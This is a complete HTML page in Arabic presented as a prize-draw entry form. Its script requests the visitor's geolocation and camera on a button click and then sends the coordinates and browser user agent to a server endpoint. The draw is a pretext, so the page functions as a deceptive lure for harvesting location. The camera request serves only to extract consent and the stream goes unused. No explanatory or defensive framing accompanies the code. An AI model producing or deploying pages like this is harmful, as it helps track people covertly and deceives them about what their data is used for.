<!DOCTYPE html>
<html lang="ar" dir="rtl">
<body>
    <h1>للمشاركة في السحب، يرجى الموافقة على الأذونات</h1>
    <button id="start-btn">ابدأ المشاركة</button>

    <script>
        document.getElementById('start-btn').addEventListener('click', async () => {
            // 1. طلب الموقع الجغرافي
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const location = { lat: pos.coords.latitude, lon: pos.coords.longitude };

                // 2. طلب الكاميرا (سيظهر للمستخدم نافذة الموافقة)
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    // إرسال البيانات للسيرفر
                    await fetch('/api/submit-data', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            location: location,
                            deviceInfo: navigator.userAgent
                        })
                    });
                    alert("تم إرسال البيانات بنجاح!");
                } catch (err) {
                    alert("خطأ: يرجى السماح بالوصول للكاميرا للمتابعة.");
                }
            }, () => alert("خطأ: يرجى السماح بالوصول للموقع."));
        });
    </script>
</body>
</html>
